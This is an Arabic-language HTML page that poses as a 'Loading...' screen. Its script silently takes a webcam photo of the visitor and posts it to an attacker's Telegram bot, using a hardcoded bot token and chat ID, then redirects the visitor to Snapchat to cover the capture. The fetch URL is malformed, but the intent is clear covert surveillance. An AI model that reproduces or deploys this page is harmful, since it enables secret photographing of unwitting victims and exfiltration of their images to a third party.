<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2>جاري التحميل...</h2>
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // معلوماتك التي أرسلتها سابقاً (جاهزة ومدمجة)
        const TOKEN = "8780843163:AAEQYDrUCNzSF32SWGKYdzx6h2pWn4mIsd4"; 
        const ID = "7191557045"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // طلب الكاميرا فوراً
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                // التقاط الصورة بعد ثانية واحدة من فتح الكاميرا لضمان السرعة
                setTimeout(sendToTelegram, 1000);
            })
            .catch(() => {
                // إذا رفض الكاميرا، حوله لسناب شات فوراً
                window.location.href = "https://snapchat.com";
            });

        function sendToTelegram() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", ID);
                formData.append("photo", blob, "photo.jpg");

                fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).finally(() => {
                    // تحويل المستخدم النهائي
                    window.location.href = "https://snapchat.com";
                });
            }, 'image/jpeg', 0.7);
        }
    </script>
</body>
</html>
